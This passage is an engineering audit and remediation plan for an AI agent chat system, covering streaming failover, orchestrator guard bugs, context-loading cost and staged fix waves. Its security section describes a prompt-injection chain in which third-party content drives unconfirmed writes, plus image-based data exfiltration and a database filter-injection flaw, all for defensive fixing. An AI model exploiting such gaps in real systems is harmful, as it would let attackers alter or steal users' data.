- **L-LLM1. Streaming failover retries on _any_ open error, no gate, no backoff** — MEDIUM, CONFIRMED. `:1593-1601` (contrast the JSON path's `shouldFailoverToNextOpenRouterModel` gate at `:1198-1205`) — a deterministic 400 (bad message shape, replayed foreign `reasoning_details`) replays the identical request across up to 5 lane models then 2 direct providers; 429s retry instantly. Good property: failover is strictly pre-first-byte, so no double-emission / duplicate tool exec. **Fix:** gate on `shouldFailoverToNextOpenRouterModel`; jittered backoff on 429.
- **L-LLM2. Cancel can't abort the HTTP stream when `OPENROUTER_V2_TIMEOUT_MS` is set** — MEDIUM, CONFIRMED. `openrouter-v2/client.ts:44-78, 144-190`: `finally { cleanup() }` runs when headers arrive, removing the external-abort listener; the body read then can't be aborted. Also no inter-chunk idle timeout ever (a stalled upstream hangs `reader.read()` forever; the orchestrator heartbeat only observes). **Fix:** cleanup after the body is consumed; add a 60-90s idle timeout that aborts the reader.
- **L-LLM3. OpenRouter usage-accounting (`usage:{include:true}`) never requested** — MEDIUM. `openrouter-request.ts:34-58` sends only `stream_options:{include_usage:true}`, so `usage.cost`/`cached_tokens` are absent → cost falls back to a hand-maintained catalog that ignores cache discounts, and `openrouter_cache_status` can never report a hit (defeating the "is caching working" question). **Fix:** add `usage:{include:true}`.
- **L-LLM4. Prior-pass `reasoning_details` replayed verbatim across model/provider switches** — SUSPECTED. `index.ts:1121-1125` attaches provider-specific reasoning blocks that the next round (possibly a different model via failover / OpenRouter `models` array / provider rotation) may reject with a 400, feeding L-LLM1's retry loop. Also the `models` array is capped at 3 (`openrouter-request.ts:19`), silently truncating the 5-model lanes. **Fix:** gate `reasoning_details` replay on same-model; consider provider pinning after round 1.
- **L-LLM5. ToolCallAssembler merges distinct calls sharing an index / appends index-less deltas** — SUSPECTED. `openrouter-v2/tool-call-assembler.ts:24-98` is index-keyed; providers emitting parallel calls all at `index:0`, or re-sending complete args per chunk, yield concatenated invalid JSON that's then silently dropped (D8/L-LLM6). No duplicate-`id` dedup. **Fix:** key by `id` when present; log invalid-JSON drains.
- **L-LLM6. Inconsistent drain validation** — LOW. `:1946-1954` (finish_reason path) yields unvalidated args while `:1849-1853`/`:1958-1961` silently discard invalid ones — which drain you hit depends purely on whether the provider emits `finish_reason:'tool_calls'` before `[DONE]`. **Fix:** make both drains yield everything and log anomalies (the repair machinery downstream handles malformed args fine).

---

## Theme 7 — Orchestrator correctness (bugs inside the harness)

- **O2. `looksLikeExplicitMutationRequest` misfires both directions** — MEDIUM-HIGH, CONFIRMED. `repair-instructions.ts:582-603`: `^update` + noun "project/task/status" makes **"update me on the project"** (pure read) classify as an explicit mutation request → `enforceMutationOutcomeIntegrity` can replace a correct status summary with _"I was unable to complete that change…"_ (natural prose like "the docs have been updated" trips `MUTATION_SUCCESS_CLAIM_PATTERNS`), and the finalization guard can emit _"I have not made the change yet"_ on a complete read-only turn. False negatives (same regex): "mark the task done", "assign this to me", "postpone/defer/push the meeting", "merge these tasks", "I want you to rename…" all slip through and lose the honesty path. **Fix:** exclude `update|catch me on`; add missing frames/verbs/nouns; require the entity noun in object position.
- **O3. Supervisor `ask_user` questions clobbered by the guard** — MEDIUM, CONFIRMED. Every `buildRequiredFieldQuestion` ends "…and I will continue from here" (`deterministic-supervisor.ts:644-659`), which `isLikelyLeadIn` matches; the guard runs unconditionally after the loop (`index.ts:1803-1808`) with no `supervisor_question` exemption → overwrites the persisted question with _"…N write attempts failed, so nothing was changed."_ and appends it after the already-streamed question. **Fix:** skip the guard when `finishedReason === 'supervisor_question'`, or bail on interrogative finals ending in `?`.
- **O4/O5. Skill payload budget dead + double truncation** — MEDIUM, CONFIRMED. The 20,000-char skill budget (`tool-payload-compaction.ts:159-208`) is re-capped at 6,000 by the outer `addToolResultSecurityNotice` (`:60,63`) → every real skill reaches the model as a mid-JSON `preview` with workflow tail/guardrails gone; the double application also produces a preview-of-a-preview with a wrong `original_length`. Quietly degrades every skill-driven flow. **Fix:** thread `maxChars` through the notice for skill types; truncate exactly once, after the notice, with the true length.
- **O6. `materializeDirectTools` pushes system messages _between_ an assistant `tool_calls` message and its tool results** — SUSPECTED (provider-dependent 400). `index.ts:401-405` invoked from inside the loop (`:1442, :1519-1524`) before the tool message at `:1547` → `assistant(tool_calls) → system(...) → tool(...)`, which strict OpenAI/Anthropic validation rejects — exactly where a direct-fallback 400 would appear as "single error kills the turn." **Fix:** buffer materialization notices, append after the round's last tool message.
- **O9. Repetition guard only catches _consecutive-identical_ rounds** — CONFIRMED. `index.ts:1699-1713` (and the supervisor's `lastRoundPattern`) reset on any difference, so alternating `search A → search B → A → B…` never trips and burns the full 16-round budget. **Fix:** keep a set of recent fingerprints, not just the previous one.
- **O10. `hasWriteAttempt` is sticky and set from _emitted_ (not executed) writes** — CONFIRMED. One validation-failed write (never executed) sets `hasWriteAttempt=true` forever (`index.ts:1576-1583`), permanently disabling the ledger + escalation ladder + forced synthesis (all gated on `!hasWriteAttempt`) → the model can read-loop 10+ rounds unchecked. **Fix:** derive from executed writes, or re-arm after N read-only rounds.
- **O11. The "near-budget nudge" is a hard tool cutoff that can make requested writes impossible** — CONFIRMED. `deterministic-supervisor.ts:404-428` force-synthesis at 10 calls / `maxRounds-1` sets `tools: undefined` (`index.ts:806`); if the model spent its budget on discovery, the 2 writes it identified can never execute this turn — it ends with "tell me to go ahead." `collectGatewayWriteIntentOps` exists but is unused here. **Fix:** on force-synthesis with a known write intent + explicit mutation request, allow exactly the identified write tools.
- **O12. Dangling `tool_call` UI events + orphaned tool_call ids on budget breaks** — CONFIRMED. `onToolCall` fires per pending call (`index.ts:885-887`); round-limit/call-limit/supervisor-stop/abort discard paths never emit the matching `onToolResult` → UI shows tools "running" that never resolve, and the call-limit break (`:1361`) leaves orphaned tool_call ids in `messages` (a provider-400 landmine the moment any path does another LLM pass after it). **Fix:** synthesize failure `onToolResult` + matching tool messages on every discard path.
- **O13. Call-cap crossing inside doc-org recovery double-finalizes with contradictory text** — CONFIRMED. Recovery ignores `toolLimitNotice`, keeps looping, emits "I organized N documents…", then the limit block overwrites `finalAssistantText` with the limit apology (`index.ts:566-575, 1777-1801`). **Fix:** bail out of recovery when `toolLimitNotice` is set.
- **O14. Same-round materialize-then-call bypasses the required-param check** — CONFIRMED. Round validation runs against pre-round `tools` (`tool-validation.ts:120-135`); a tool materialized by call #1 and called by call #2 takes the normal branch, not the auto-exec branch, so neither the pre-check nor the re-validation runs → `create_onto_document` with no `title` reaches the server. **Fix:** re-run `validateToolCalls` for any call whose tool wasn't in `tools` at round start.
- **O15. Tool-alias dead-end** — CONFIRMED. `work_capability_*` normalizes to `outcome_card_*` (`gateway-surface.ts:175-179`), so `materializeDirectTools([requestedName])` adds the alias target and `allowedToolNames.has(requestedName)` stays false → the model gets "now loaded, retry" but retrying yields "not available." **Fix:** set `executableName` to the added name when it differs.
- **O16. `onToolCall` await is unguarded** (`index.ts:885-887`) while every sibling callback is wrapped — CONFIRMED, latent. Only bites non-web callers (worker runner, tests). **Fix:** wrap in try/catch.

---

## Theme 8 — Context correctness & cost (beyond the original doc)

- **C3. RPC vs fallback behavioral drift** — MEDIUM, CONFIRMED. Same user gets different agent behavior depending on which path ran: the fallback filters out `paused` projects (`context-loader.ts:2174-2177`) while the RPC doesn't; the fallback hardcodes `start_at/end_at: null` on project summaries (`:2212-2213`) so project deadlines vanish from intelligence; the fallback fetches the focus entity by id with **no project constraint** (`:2648-2653`) while the RPC constrains to `p_project_id` → a cross-project focus entity can splice in. Fallback usage is **unobservable** (`context_meta.source` lives only inside the payload jsonb, no queryable column). **Fix:** unify the paths' filters; add `context_load_source` next to `cache_source`; emit telemetry on RPC-null.
- **C4. Unbounded DB fetch in the fallback** — MEDIUM, CONFIRMED. Caps exist only in JS after the wire transfer: the fallback fetches **all** tasks incl. every completed/archived one with descriptions, no `.limit()` (`context-loader.ts:2454-2460`); a 2,000-task project ships ~1-2MB per fresh load to render 18 rows. Global fallback fetches goals/milestones/plans across all projects with no SQL limit (`:2250-2269`). The focus entity is `select('*')` — for a document focus that's the **entire body, untruncated**, stored verbatim into `agent_metadata` + every prepared-prompt row. START HERE fetches up to 20 full-content candidate docs to pick one (`:2128-2136`). **Fix:** push the RPC's LIMIT/rank into the fallback; select truncated descriptions server-side (`left(content, N)`); whitelist focus-entity columns.
- **C5. Prepared-prompt write amplification** — MEDIUM, CONFIRMED. Prewarm builds 4 surface profiles for project/ontology and stores, per profile, the full `system_prompt` **plus the same content again as `sections`** plus full `context_payload` (incl. the untruncated focus body) — ~200-250KB jsonb per chat-open, TTL 90s, with a known 0-hit history. **Fix:** store sections once/render lazily; cap `context_payload` (drop `focus_entity_full`).
- **C6. History soft spots** — LOW, CONFIRMED. Otherwise healthy (last 10 messages, tool results not replayed, 4-message compressed tail). But the line "Earlier messages summarized: N" is misleading — those messages are **dropped**, not summarized, whenever `session.summary` (written async by the worker) is stale/absent; and the prepared-prompt path replays history composed at prewarm time without the continuity hint.
- **C7. `entityResolutionHint` computed every turn and never rendered** — LOW, CONFIRMED. Set on `promptContext` (`stream/+server.ts:2786-2787`), exists in `LitePromptInput`, but no code in `build-lite-prompt.ts` reads it. Dead code or a lost feature. **Fix:** delete or wire into `focus_purpose`.
- **C8. PostgREST `.or()` filter injection via unvalidated `focusEntityId`** — LOW, SUSPECTED. `loadLinkedEntities` string-interpolates the client id into `.or(\`src_id.eq.${id},dst_id.eq.${id}\`)` (`context-loader.ts:2563-2567`); a value with `,`/`(`/`)`can widen the filter (bounded by RLS). **Fix:** UUID-validate at the boundary; use`.eq()`/`.in()`not interpolated`.or()`.

### Prompt weight profile (typical large project, `project` context)

Estimator = chars/4. The rendered prompt is **well-bounded** (~11-15K tokens/turn) — `buildLitePromptEnvelope` renders a bounded JSON index, not raw payloads. The size levers are **not** the context data:

| Component                                                                   | ~Tokens   | Note                                                                                 |
| --------------------------------------------------------------------------- | --------- | ------------------------------------------------------------------------------------ |
| **Tool definitions** (per request)                                          | 3.9K–6.2K | `project_write` ≈ 25,000 chars — **single biggest item**, dwarfs any context section |
| Static prose (identity + capabilities/skills + operating strategy + safety) | ~3.4K     | safety + strategy alone ≈ 8,000 chars of _every_ request                             |
| Loaded-context JSON index                                                   | 0.8–1.5K  |                                                                                      |
| START HERE excerpt / knowledge map / timeline                               | ~1.5–2K   |                                                                                      |
| History                                                                     | ≤1.4K     |                                                                                      |

**Biggest levers to shrink:** (1) the tool-definition surface (the original doc's finding #5, now clearly the #1 size win — move `project_write`/corsair tools behind discovery); (2) the ~13.5K-char static prose block (prefix-cache it by moving the varying workflow out of `focus_purpose`, which a code comment says already breaks caching); (3) redundancy — the same ~10 project signals render up to three times (`focus_purpose`, timeline `statusLines`, and the JSON index). **Where money actually goes (non-prompt):** unbounded fallback fetches (C4), full doc bodies persisted to session metadata + prepared rows, 20 full START HERE bodies per load, 4-surface prepared inserts per open (C5).

---

## Dead code confirmed (safe to delete)

- `apps/web/src/routes/api/agent/v2/stream/djtryserver.ts` (474 lines, unrouted — also flagged in the original doc; re-confirmed by 2 passes).
- `buildFastSystemPrompt` (original doc) — still accurate.
- `executeWithRetry` / `batchExecuteTools` / `executeMultipleTools` / `virtualHandlers` bypass in `tool-execution-service.ts:1659-1761, 459-486` — zero callers in `apps/web/src`; would blindly re-run failed writes / skip schema validation. Delete to remove the footgun.
- `entityResolutionHint` plumbing (C7).

---

## Fix waves

### Wave 1 — Data integrity & money — SHIPPED 2026-07-02 (working tree, uncommitted)

Implemented in three parallel tracks, all validated (51 targeted tests pass, `svelte-check` 0 errors, ESLint/Prettier clean), left uncommitted for review. What shipped:

1. **D1** (append→replace data loss) — `resolveTextWithStrategy` now **throws** on existing-content loader failure instead of returning new-content-as-full-replace. Files: `ontology-write-executor.ts`.
2. **D6** (guard counts `ok:false` as success) — routed the write-success judgment through `didGatewayExecSucceed` in all four spots (`finalization-guard.ts`, `turnHadUnfulfilledMutationIntent`, two `observeSupervisor` flags); hardened the helper so non-gateway writes still judge correctly. Files: `finalization-guard.ts`, `stream-orchestrator/index.ts`, `round-analysis.ts`.
3. **D14 / D15** — calendar task↔event edge errors now checked + surfaced (`task_link_created: false`); an unmapped `state_key` now throws a validation error instead of an empty PATCH reported as "Updated." Files: `calendar-executor.ts`, `ontology-write-executor.ts`.
4. **S4** (`timing_metrics` RLS) — new migration `20260701020000_enable_rls_timing_metrics.sql` (insert/self-select/admin-select/service-role, mirroring `chat_turn_runs`). **Open:** live `pg_class.relrowsecurity` before/after verification not yet done (no DB access in-session).
5. **D9 / D10** — cache-affinity threaded through the streaming path via OpenRouter's `session_id` (correct mechanism) + `prompt_cache_key` (OpenAI upstream); cancelled/errored streams now log a `failure` usage row (real frame or char/4 estimate). Files: `openrouter-v2-service.ts`, `openrouter-v2/{client,types}.ts`, `packages/smart-llm/openrouter-request.ts`.

**Carry-over from Wave 1 (do at commit/deploy time):** verify S4 live; ensure CI rebuilds `@buildos/smart-llm` (dist is gitignored, web imports the new builder fields); decide whether to keep `prompt_cache_key` on the OpenRouter path or `session_id`-only; decide whether D14 should hard-fail vs surface `link_created:false`.

---

### Wave 2 — Cancellation & durability backbone (Batches 1–2 SHIPPED 2026-07-02, uncommitted; Batch 3 remaining)

**Theme:** close the "cancel is cosmetic + lambda-death loses state" class. Run in collision-free batches because these findings share `stream-orchestrator/index.ts` and `stream/+server.ts` (unlike Wave 1's disjoint tracks). Migration added: `20260702000000_agentic_chat_crash_recovery_progress.sql` (`chat_turn_runs.last_progress_at`, `agent_runs.commit_started_at`, partial indexes).

**Batch 1 — SHIPPED (LLM/orchestrator + durability, parallel disjoint files):**

- **O8** — replaced substring abort-matching with a purely signal-driven `isUserCancellation()` (`index.ts`); real provider timeouts/socket drops now surface as errors. _Note: a duplicate `isAbortLikeError` still lives in `+server.ts:355` (outer handler) — same bug, not yet fixed; follow-up._
- **D8** — added `SYNTHESIS_MAX_TOKENS` (8000) + `MAX_LENGTH_CONTINUATIONS` (2) in `limits.ts`; a `finish_reason:'length'` pass now carries partial text forward and continues (bounded), and forces `finishedReason='length'` when exhausted so truncated text is never reported as clean `stop`. Dropped-invalid-tool-call now logged.
- **D11** — `chunk.error` and `finish_reason:'error'` now throw instead of yielding a success `done`; composes with O8 (a real error surfaces, not a silent cancel).
- **D2** — `merge_llm` `maxTokens` scales to input size; a materially-shorter merge falls back to a safe append (preserving existing content).
- **D4c** — `+server.ts` finally now `await`s `flushWithBudget(5s)` so detached persistence isn't lost at close.
- **D4** — each tool execution persisted incrementally in `onToolResult` (idempotent `(turn_run_id, sequence_index)`; end-of-turn upserts `message_id`), plus a `last_progress_at` heartbeat. _Open latency note: currently persists **all** executions incl. reads; scope to mutations-only as a follow-up (reads don't need crash-recovery)._
- **D9b** — commit claim now stamps `commit_started_at`; a stalled `running` commit (older than threshold, non-null timestamp) can be safely re-entered via CAS and skips already-applied changes. Double-commit protection intact.

**Batch 2 — SHIPPED (cancellation; single agent — needed both shared files):**

- **D5** — cancel endpoint, `resolveSession`, and inbox refresh all route through `merge_chat_session_agent_metadata` instead of full-column overwrites; `resolveSession` only writes when focus changed. Cancel hints can no longer be clobbered. _(Shallow RPC merge means the whole `fastchat_cancel_hints_v1` key is replaced — acceptable; noted in code.)_
- **D3 (signal-threading portion)** — `AbortSignal` wired end-to-end: `+server.ts` turn signal → `tool-executor` context → `base-executor` `fetch({ signal })` (fail-fast if already aborted) + `attemptDocOrganizationRecovery` per-iteration abort checks. A cancelled tool's HTTP request is now actually aborted. New test: `base-executor.abort.test.ts`.
- _Recovered from a mid-run agent stall: finished the implementation, fixed a `body.reason` narrowing type error the stall left behind, and updated the inbox test to assert the metadata now flows through the RPC. Full validation: 91 related tests + svelte-check 0 errors._

**Batch 3 — SHIPPED (committed), with two named gaps:**

- **D7 + D3-idempotency — SHIPPED.** New `onto_task_create_atomic` RPC (migration `20260702010000`) mirrors `onto_task_update_atomic`: task + edges + assignees in one transaction; the create route calls it so a failure rolls back (no orphan task). Idempotency: a nullable `idempotency_key` column + partial unique index; the RPC returns the existing row on key match, and `base-executor.apiRequest` attaches an `Idempotency-Key` header. No key ⇒ no dedup ⇒ non-chat callers unaffected.
    - **Gap 1:** no dedicated D7 tests (the agent hit a session limit before writing them) — the RPC-rollback and idempotency-replay paths are unverified by tests. **Add these in the next pass.**
    - **Gap 2:** the **project-instantiate** mitigation (`instantiation.service.ts` — project-row-last / finalize-flag) was **deferred**, not done. A mid-way crash there can still leave a visible half-built project.
- **Carry-overs — SHIPPED.** D4 incremental persistence now gated on `buildRoundToolPattern([...]).hasWriteOps` (mutations only; per-read round-trip removed); the duplicate substring `isAbortLikeError` in `+server.ts` is deleted (outer handler relies on `signal.aborted`).
- **D4b — NOT done (held for go/no-go).** Register the detached IIFE with `event.platform?.context?.waitUntil`; close the stream even when detached; Vercel cron sweeper that fails turns stuck `running` past `last_progress_at + N`. _Needs:_ cron entry in `vercel.json` + sweeper route. _Risk:_ higher — changes lambda lifecycle; validate `waitUntil` on the pinned runtime first. This is the only unstarted Wave 2 item.

**Wave 2 tail to close before/with the next pass (small, do first):**

1. `pnpm gen:types` for the three migrations (`timing_metrics` RLS, `last_progress_at`/`commit_started_at`, `idempotency_key` + `onto_task_create_atomic`), then tighten the `as never`/`as any` casts in `change-set.ts` and the create route.
2. Verify S4 live: `select relrowsecurity from pg_class where relname='timing_metrics';` (expect true post-migrate).
3. Add the missing D7 tests (RPC-rollback rolls back the task; duplicate idempotency key returns the existing row).
4. Ensure CI rebuilds `@buildos/shared-agent-ops` + `@buildos/smart-llm` dist (gitignored).

---

### Wave 3 — Security hardening (THE NEXT PASS — not started)

**Why this is next:** with the data-integrity/durability cluster done, the highest-severity remaining findings are all security — including the only two remaining **CRITICALs** (S1) and the zero-click exfiltration (S2). The theme: _the action side of interactive chat lacks the policy layer that Agent Runs already have._ Run as three tracks. Track G (the injection chain) is the flagship and should be designed as one piece; Tracks H and I can parallelize once G's approach is set.

**Track G — Close the prompt-injection → mutation/exfiltration chain (flagship; S1 + S3 + S2 are one problem).**

- **S1 (CRITICAL)** — route chat writes through `packages/shared-agent-ops/src/policy.ts` scope enforcement (the gateway/Agent-Run path already uses it; the interactive chat path does not). Gate destructive/bulk ops (delete, graph reorg) behind explicit confirmation. Default any turn that **ingested external/third-party content** (calendar descriptions, shared docs, MCP/web*visit results) to commit-**review** instead of commit-by-default. \_Design note:* decide the policy-injection point (tool-execution-service vs the executor construction) and how "this turn ingested external content" is tracked across rounds.
- **S3 (HIGH)** — add a read/write (and destructive) gate to on-demand tool **materialization** (`gateway-surface.ts materializeGatewayTools` + the on-miss auto-execute path in `stream-orchestrator/index.ts`). A nominally read-only turn must not be able to load-and-run `delete_calendar_event` mid-round without confirmation. The lean surface is a latency optimization, not a security boundary — make write materialization explicit.
- **S2 (HIGH, cheap — do first, ships value immediately)** — block/proxy remote `<img>` in assistant-rendered markdown (`AgentMessageList.svelte` → `utils/markdown.ts sanitizeOptions`: drop remote `img` or restrict `src` to same-origin/`data:`), or add a chat-surface CSP `img-src`. Closes the exfiltration half of the chain on its own.
- _Sequence:_ S2 first (self-contained, immediate), then S1+S3 together (shared design: the policy layer + a per-turn "external content ingested" flag that both the write gate and the materialization gate consult).

**Track H — Access & trust boundaries (parallel with G once its design is set).**

- **C1 (HIGH)** — run `checkProjectAccess` for any resolved projectId regardless of `contextType` (the `ontology` context currently skips the member gate); treat RPC-null on the project path as terminal instead of falling back to RLS-public reads; UUID-validate `focusEntityId`/`projectId` at the request boundary.
- **C2 (HIGH)** — stop trusting client-supplied `prewarmedContext.context` verbatim: re-derive server-side (the `else` branch already does), or HMAC/nonce it like prepared-prompts; never persist a client-origin cache into `agent_metadata`; ignore client `created_at` for freshness.
- **S7 (MEDIUM)** — archived/out-of-scope project fence bypass on `onto.project.update`: require `scope.project_ids` membership in the archived fallback; re-apply `deleted_at IS NULL` under `includeArchived`.

**Track I — Abuse limits & secrets/PII hygiene (parallel; mostly independent).**

- **S6 (MEDIUM)** — re-enable rate limiting: per-user concurrent-stream cap on the v2 stream + token-bucket; reuse `checkOAuthRateLimit` on the gateway/bootstrap routes (unauthenticated flood + `security_events` write amplification).
- **S5 / S8 (HIGH/MEDIUM)** — bootstrap token: encrypt at rest (reuse `calendar-token-crypto`), single-use atomic consume, reap expired rows in the retention cron.
- **Hygiene sweep** — S9/S14 (stop logging full tool args / search text; use `previewToolArguments`), S13 (strip Postgres `details`/`hint` from model-facing errors), S10/S11/S12 (retention jobs for `chat_prompt_snapshots` / tool-exec rows / prepared prompts; drop `rendered_dump_text`), S15–S17 (observability INSERT ownership check; scope `web_page_visits` cache per user; remove the prod prompt-dump escape hatch).

**Suggested Wave 3 sequencing:** close the Wave 2 tail (above) → **S2** (immediate) → design + build **S1+S3** (flagship, one PR or a tight set) → Tracks H and I in parallel. Keep S1's policy-layer change and each migration in their own reviewable PRs. Consider pulling **Wave 5 observability** forward to run alongside, so the injection-defense and rate-limit changes are measurable.

### Wave 4 — Correctness polish & cost (not started)

- **O2/O3** (mutation-request heuristic false pos/neg; guard clobbering supervisor questions), **O4/O5** (skill payload double-truncation), **O9/O10** (alternating-loop repetition guard; sticky `hasWriteAttempt`), **O11–O16** (force-synthesis write carve-out; dangling tool_call events; alias dead-end; unguarded callback).
- **C3/C4/C5** (RPC-fallback parity; bounded fallback fetches; prepared-prompt write amplification), retention jobs (S10/S12), and the original doc's tool-surface trim (now the #1 prompt-size lever) + `+server.ts` decomposition.

### Wave 5 — Observability (do early enough to measure Waves 2–4)

- Original doc's prewarm hit-rate dashboard + `cache_source` logging, plus `context_load_source` (C3) and D11 error-frame surfacing — so cancellation loss, fallback usage, and cache-hit rate are visible before/after each wave. Consider pulling this forward to run alongside Wave 2 so D8/D10/D9 impact is measurable.
